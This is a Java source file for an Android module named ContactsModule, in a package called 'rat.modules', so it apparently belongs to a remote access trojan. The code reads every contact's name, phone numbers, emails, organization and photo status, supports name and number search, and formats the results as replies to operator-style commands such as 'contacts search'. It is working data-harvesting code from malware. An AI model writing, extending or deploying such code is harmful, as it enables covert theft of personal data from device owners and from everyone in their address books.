package com.fly0rakoon.rat.modules;

import android.Manifest;
import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Locale;

public class ContactsModule {
    
    private static final String TAG = "ContactsModule";
    
    // Contact projection columns
    private static final String[] CONTACTS_PROJECTION = {
        ContactsContract.Contacts._ID,
        ContactsContract.Contacts.DISPLAY_NAME,
        ContactsContract.Contacts.HAS_PHONE_NUMBER,
        ContactsContract.Contacts.PHOTO_URI,
        ContactsContract.Contacts.LOOKUP_KEY
    };
    
    private static final String[] PHONE_PROJECTION = {
        ContactsContract.CommonDataKinds.Phone.NUMBER,
        ContactsContract.CommonDataKinds.Phone.TYPE,
        ContactsContract.CommonDataKinds.Phone.LABEL
    };
    
    private static final String[] EMAIL_PROJECTION = {
        ContactsContract.CommonDataKinds.Email.ADDRESS,
        ContactsContract.CommonDataKinds.Email.TYPE,
        ContactsContract.CommonDataKinds.Email.LABEL
    };
    
    private Context context;
    
    public ContactsModule(Context context) {
        this.context = context;
    }
    
    public String getContacts() {
        return getContacts(100); // Default to 100 contacts
    }
    
    public String getContacts(int limit) {
        if (!checkContactsPermission()) {
            return "ERROR: Contacts permission not granted";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Contacts (first ").append(limit).append("):\n");
        result.append("=".repeat(50)).append("\n");
        
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        int contactCount = 0;
        
        try {
            // Query contacts
            cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                CONTACTS_PROJECTION,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT " + limit
            );
            
            if (cursor == null) {
                return "ERROR: Could not query contacts";
            }
            
            while (cursor.moveToNext()) {
                contactCount++;
                
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                int hasPhoneNumber = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                String photoUri = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.PHOTO_URI));
                
                result.append("\n📞 Contact #").append(contactCount).append("\n");
                result.append("Name: ").append(displayName != null ? displayName : "Unknown").append("\n");
                
                if (hasPhoneNumber > 0) {
                    // Get phone numbers
                    Cursor phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        PHONE_PROJECTION,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );
                    
                    if (phoneCursor != null) {
                        int phoneCount = 0;
                        while (phoneCursor.moveToNext()) {
                            phoneCount++;
                            String number = phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                            int type = phoneCursor.getInt(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.TYPE));
                            String label = phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.LABEL));
                            
                            String typeStr = getPhoneType(type, label);
                            result.append("  📱 ").append(typeStr).append(": ").append(number).append("\n");
                        }
                        phoneCursor.close();
                        
                        if (phoneCount == 0) {
                            result.append("  No phone numbers\n");
                        }
                    }
                } else {
                    result.append("  No phone numbers\n");
                }
                
                // Get email addresses
                Cursor emailCursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    EMAIL_PROJECTION,
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                    new String[]{contactId},
                    null
                );
                
                if (emailCursor != null) {
                    while (emailCursor.moveToNext()) {
                        String email = emailCursor.getString(emailCursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Email.ADDRESS));
                        int type = emailCursor.getInt(emailCursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Email.TYPE));
                        String label = emailCursor.getString(emailCursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Email.LABEL));
                        
                        String typeStr = getEmailType(type, label);
                        result.append("  ✉️ ").append(typeStr).append(": ").append(email).append("\n");
                    }
                    emailCursor.close();
                }
                
                if (photoUri != null) {
                    result.append("  Has photo\n");
                }
                
                result.append("-".repeat(40)).append("\n");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            return "ERROR: Security exception accessing contacts";
        } catch (Exception e) {
            Log.e(TAG, "Error getting contacts: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        if (contactCount == 0) {
            return "No contacts found";
        }
        
        result.append("\nTotal contacts shown: ").append(contactCount);
        return result.toString();
    }
    
    public String searchContact(String query) {
        if (!checkContactsPermission()) {
            return "ERROR: Contacts permission not granted";
        }
        
        if (query == null || query.isEmpty()) {
            return "Usage: contacts search <name or number>";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Search results for: \"").append(query).append("\"\n");
        result.append("=".repeat(50)).append("\n");
        
        ContentResolver contentResolver = context.getContentResolver();
        
        try {
            // Search by name
            String selection = ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?";
            String[] selectionArgs = new String[]{"%" + query + "%"};
            
            Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                CONTACTS_PROJECTION,
                selection,
                selectionArgs,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null) {
                int nameMatches = 0;
                while (cursor.moveToNext()) {
                    nameMatches++;
                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    result.append("\n📞 ").append(displayName).append("\n");
                    
                    // Get phone numbers for this contact
                    Cursor phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        PHONE_PROJECTION,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );
                    
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String number = phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                            if (number.contains(query)) {
                                result.append("  🔍 Number matches query!\n");
                            }
                            int type = phoneCursor.getInt(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.TYPE));
                            String label = phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.LABEL));
                            
                            result.append("  ").append(getPhoneType(type, label))
                                 .append(": ").append(number).append("\n");
                        }
                        phoneCursor.close();
                    }
                    
                    result.append("-".repeat(30)).append("\n");
                }
                cursor.close();
                
                if (nameMatches == 0) {
                    result.append("No contacts found with that name.\n");
                } else {
                    result.append("\nFound ").append(nameMatches).append(" contacts by name.");
                }
            }
            
            // Search by phone number
            result.append("\n\nSearching by phone number...\n");
            String phoneSelection = ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE ?";
            String[] phoneArgs = new String[]{"%" + query + "%"};
            
            Cursor phoneCursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                },
                phoneSelection,
                phoneArgs,
                null
            );
            
            if (phoneCursor != null) {
                int phoneMatches = 0;
                while (phoneCursor.moveToNext()) {
                    phoneMatches++;
                    String name = phoneCursor.getString(phoneCursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = phoneCursor.getString(phoneCursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    int type = phoneCursor.getInt(phoneCursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.TYPE));
                    
                    result.append("\n📞 ").append(name).append("\n");
                    result.append("  📱 ").append(getPhoneType(type, null))
                         .append(": ").append(number).append(" (MATCH)\n");
                }
                phoneCursor.close();
                
                if (phoneMatches == 0) {
                    result.append("No contacts found with that phone number.\n");
                } else {
                    result.append("\nFound ").append(phoneMatches).append(" contacts by phone number.");
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error searching contacts: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    public String getContactDetails(String contactId) {
        if (!checkContactsPermission()) {
            return "ERROR: Contacts permission not granted";
        }
        
        if (contactId == null || contactId.isEmpty()) {
            return "Usage: contacts details <contact_id>";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Contact Details (ID: ").append(contactId).append("):\n");
        result.append("=".repeat(50)).append("\n");
        
        ContentResolver contentResolver = context.getContentResolver();
        
        try {
            // Get basic contact info
            Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                CONTACTS_PROJECTION,
                ContactsContract.Contacts._ID + " = ?",
                new String[]{contactId},
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                String displayName = cursor.getString(cursor.getColumnIndex(
                    ContactsContract.Contacts.DISPLAY_NAME));
                int hasPhoneNumber = cursor.getInt(cursor.getColumnIndex(
                    ContactsContract.Contacts.HAS_PHONE_NUMBER));
                String photoUri = cursor.getString(cursor.getColumnIndex(
                    ContactsContract.Contacts.PHOTO_URI));
                
                result.append("Name: ").append(displayName).append("\n");
                
                if (photoUri != null) {
                    result.append("Has photo: Yes\n");
                }
                
                // Get all phone numbers
                if (hasPhoneNumber > 0) {
                    Cursor phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        PHONE_PROJECTION,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );
                    
                    if (phoneCursor != null) {
                        result.append("\nPhone Numbers:\n");
                        while (phoneCursor.moveToNext()) {
                            String number = phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                            int type = phoneCursor.getInt(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.TYPE));
                            String label = phoneCursor.getString(phoneCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.LABEL));
                            
                            result.append("  • ").append(getPhoneType(type, label))
                                 .append(": ").append(number).append("\n");
                        }
                        phoneCursor.close();
                    }
                }
                
                // Get all email addresses
                Cursor emailCursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    EMAIL_PROJECTION,
                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                    new String[]{contactId},
                    null
                );
                
                if (emailCursor != null) {
                    if (emailCursor.getCount() > 0) {
                        result.append("\nEmail Addresses:\n");
                        while (emailCursor.moveToNext()) {
                            String email = emailCursor.getString(emailCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Email.ADDRESS));
                            int type = emailCursor.getInt(emailCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Email.TYPE));
                            String label = emailCursor.getString(emailCursor.getColumnIndex(
                                ContactsContract.CommonDataKinds.Email.LABEL));
                            
                            result.append("  • ").append(getEmailType(type, label))
                                 .append(": ").append(email).append("\n");
                        }
                    }
                    emailCursor.close();
                }
                
                // Get organization (if any)
                Cursor orgCursor = contentResolver.query(
                    ContactsContract.Data.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Organization.COMPANY,
                        ContactsContract.CommonDataKinds.Organization.TITLE,
                        ContactsContract.CommonDataKinds.Organization.DEPARTMENT
                    },
                    ContactsContract.Data.CONTACT_ID + " = ? AND " +
                    ContactsContract.Data.MIMETYPE + " = ?",
                    new String[]{contactId, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE},
                    null
                );
                
                if (orgCursor != null && orgCursor.moveToFirst()) {
                    String company = orgCursor.getString(orgCursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Organization.COMPANY));
                    String title = orgCursor.getString(orgCursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Organization.TITLE));
                    String department = orgCursor.getString(orgCursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Organization.DEPARTMENT));
                    
                    result.append("\nOrganization:\n");
                    if (company != null) result.append("  Company: ").append(company).append("\n");
                    if (title != null) result.append("  Title: ").append(title).append("\n");
                    if (department != null) result.append("  Department: ").append(department).append("\n");
                }
                if (orgCursor != null) orgCursor.close();
                
                cursor.close();
            } else {
                return "Contact not found";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact details: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    private String getPhoneType(int type, String label) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                return "Fax (Work)";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                return "Fax (Home)";
            case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                return "Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK:
                return "Callback";
            case ContactsContract.CommonDataKinds.Phone.TYPE_CAR:
                return "Car";
            case ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN:
                return "Company Main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_ISDN:
                return "ISDN";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                return "Main";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX:
                return "Other Fax";
            case ContactsContract.CommonDataKinds.Phone.TYPE_RADIO:
                return "Radio";
            case ContactsContract.CommonDataKinds.Phone.TYPE_TELEX:
                return "Telex";
            case ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD:
                return "TTY/TDD";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE:
                return "Work Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER:
                return "Work Pager";
            case ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT:
                return "Assistant";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MMS:
                return "MMS";
            default:
                if (label != null && !label.isEmpty()) {
                    return label;
                }
                return "Unknown";
        }
    }
    
    private String getEmailType(int type, String label) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Email.TYPE_HOME:
                return "Home";
            case ContactsContract.CommonDataKinds.Email.TYPE_WORK:
                return "Work";
            case ContactsContract.CommonDataKinds.Email.TYPE_OTHER:
                return "Other";
            case ContactsContract.CommonDataKinds.Email.TYPE_MOBILE:
                return "Mobile";
            default:
                if (label != null && !label.isEmpty()) {
                    return label;
                }
                return "Unknown";
        }
    }
    
    private boolean checkContactsPermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }
    
    public String getContactsCount() {
        if (!checkContactsPermission()) {
            return "ERROR: Contacts permission not granted";
        }
        
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        
        try {
            cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{"COUNT(*)"},
                null,
                null,
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = cursor.getInt(0);
                return "Total contacts: " + count;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error counting contacts: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return "Could not count contacts";
    }
}